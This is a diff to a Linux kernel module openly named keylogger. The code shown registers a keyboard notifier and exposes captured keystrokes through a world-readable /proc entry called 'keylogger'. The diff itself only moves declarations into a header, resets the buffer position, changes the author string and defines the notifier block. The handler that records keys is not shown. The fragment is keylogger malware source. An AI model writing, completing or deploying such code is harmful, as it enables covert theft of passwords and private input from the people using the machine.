@@ -1,16 +1,5 @@
 #include "keylogger.h"
 
-#include <linux/fs.h>
-#include <linux/proc_fs.h>
-#include <linux/seq_file.h>
-#include <linux/uaccess.h>
-
-#define PROC_FILE_NAME "keylogger"
-
-static struct proc_dir_entry *proc_entry;
-static char keys_buffer[1024]; // Bufor na przechowywanie danych
-static int keys_buffer_pos = 0; // Aktualna pozycja w buforze
-
 static int keylogger_proc_open(struct inode *inode, struct file *file) {
     return 0;
 }
@@ -45,6 +34,7 @@ static int keylogger_notify(struct notifier_block *nblock, unsigned long code, v
 }
 
 static int __init keylogger_init(void) {
+    keys_buffer_pos = 0;
     register_keyboard_notifier(&keylogger_nb);
     
     proc_entry = proc_create(PROC_FILE_NAME, 0644, NULL, &keylogger_proc_fops);
@@ -67,4 +57,8 @@ static void __exit keylogger_exit(void) {
 module_init(keylogger_init);
 module_exit(keylogger_exit);
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Piotr :)");
+MODULE_AUTHOR("PC:)");
+
+static struct notifier_block keylogger_nb = {
+    .notifier_call = keylogger_notify
+};
